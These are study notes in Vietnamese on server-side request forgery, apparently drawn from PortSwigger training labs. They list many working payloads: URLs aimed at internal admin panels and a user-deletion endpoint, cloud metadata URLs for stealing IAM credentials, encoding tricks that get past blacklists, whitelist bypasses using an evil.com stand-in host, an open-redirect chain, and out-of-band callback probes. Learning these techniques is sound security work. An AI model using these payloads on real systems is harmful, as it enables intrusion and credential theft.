sau khi học phần này, mình hiểu là...
SSRF = server gửi request hộ mình
-> mình chỉ điều khiển cái URL
-> server mới là thằng đi fetch thật

nên mình luôn tự hỏi:
cái input này có chui vào request phía server không

### 1. định nghĩa
- server nhận URL từ mình
- server tự gửi request tới URL đó
- mình điều khiển được destination
-> chi tiết ở [[định nghĩa SSRF]]
-> bản intro ở [[intro to ssrf]]
-> roadmap ở [[0-roadmap SSRF]]

ví dụ:
```
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```
đổi thành:
```
stockApi=http://localhost/admin
```
=> server tự mò vào localhost hộ mình

### 2. entry point
sau khi quan sát nhiều lab mình thấy...
điểm chung chỉ có 1:
backend fetch 1 cái URL rồi trả kết quả về

-> list đủ ở [[các entry point trong SSRF]]
- stockApi
- webhook verify URL
- pdf generator
- fetch ảnh / avatar
- import URL / file upload URL
- hidden field trong form
- Referer header (case blind)

ví dụ hidden field:
```html
<input type="hidden" name="avatar" value="/images/avatars/default.png">
```
-> sửa value này thành URL nội bộ
-> server fetch hộ

mẹo mình hay dùng:
- thấy full URL trong param => nghi ngay
- chỉ thấy hostname / path => vẫn nghi
- thấy `&x=` => nhớ trick cắt đuôi param

### 3. impact
-> chi tiết ở [[impact của SSRF]]
sau khi vào được trong rồi mình thấy...
- đọc internal data
- mở admin panel không lộ ra internet
- quét mạng nội bộ
- trộm cloud metadata
- chain lên RCE

ví dụ cloud:
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
-> AWS / GCP / Azure đều có endpoint này
-> lụm được IAM key là toang

### 4. blacklist bypass
-> chi tiết ở [[các cách để bypass ssrf]]
-> [[Blacklist filter bypass]]
-> [[SSRF-Blacklist bypass]]
-> [[mã hóa url để bypass blacklist]]

cơ chế chặn:
chỉ check chuỗi `127.0.0.1` hay `localhost` hay `/admin`
=> mình đổi cách viết khác nhưng backend vẫn hiểu là 1

mình hay thử theo thứ tự:
```
127.0.0.1
127.1
127.0.0.1 -> 2130706433 (decimal)
127.0.0.1 -> 017700000001 (octal)
127.0.0.1 -> 0x7f.0.0.1 (hex)
0.0.0.0
[::]
localhost -> LoCaLhOsT
admin -> %61dmin
admin -> %2561dmin (double encode)
```
ví dụ lab blacklist:
```
stockApi=http://127.1/%2561dmin/delete?username=carlos
```
-> filter nhìn không ra
-> backend decode 2 lần => ra `/admin`

### 5. whitelist bypass
-> chi tiết ở [[white list bypass]]
-> [[whitelist bypass]]
-> [[ssrf-whitelist bypass]]

sau khi quan sát mấy lab whitelist này, mình thấy filter check bằng regex/contains/startswith trong khi backend parse bằng thư viện chuẩn, lệch nhau là bypass được.

mấy món mình nhớ:
```
http://trusted.com@evil.com
```
-> filter thấy trusted.com
-> backend đi tới evil.com (sau @ mới là host thật)

```
http://evil.com#trusted.com
```
-> filter thấy trusted.com
-> backend bỏ fragment sau #

```
http://trusted.com.evil.com
```
-> filter check contains => lọt
-> DNS vẫn về server mình

```
http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```
-> case chuẩn PortSwigger
-> `%2523` decode 2 lần => `#`
-> parser confusion giữa userinfo và host

### 6. open redirect chain
-> tư duy chain ở [[Hướng tư duy khai thác SSRF]]

khi stockApi chỉ cho gọi local app
-> mình không đánh thẳng được
-> nên mình tìm redirect trên chính domain đó

flow:
```
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
```
-> filter thấy path local => cho qua
-> backend fetch local
-> local trả 302 Location tới internal
-> backend tự follow => dính

### 7. blind SSRF + collaborator
-> chi tiết ở [[Blind SSRF là gì, kịch bản tấn công]]
-> [[blind ssrf]]

blind = server có fetch
nhưng không trả response về cho mình
=> mình mù

nên mình dùng OAST:
- chèn Collaborator URL vào Referer / stockApi / webhook
- poll xem có DNS / HTTP về không

ví dụ:
```
GET /product?productId=1
Referer: https://abc123.oastify.com
```
-> có DNS => đã fetch
-> có DNS + HTTP => khai thác được sâu hơn

sau khi có blind mình hay nghĩ tới:
- quét IP nội bộ bằng timing
- bắn payload RCE mù rồi nhận callback
- redirect sang gopher / dict / file
- trả response độc để đánh HTTP client

> [!NOTE]
> bài học mình rút ra:
> - SSRF = mượn server vượt trust boundary
> - filter chuỗi lúc nào cũng lủng
> - phải validate sau DNS + sau redirect mới chắc
> - blind thì cứ Collaborator trước, tính tiếp sau
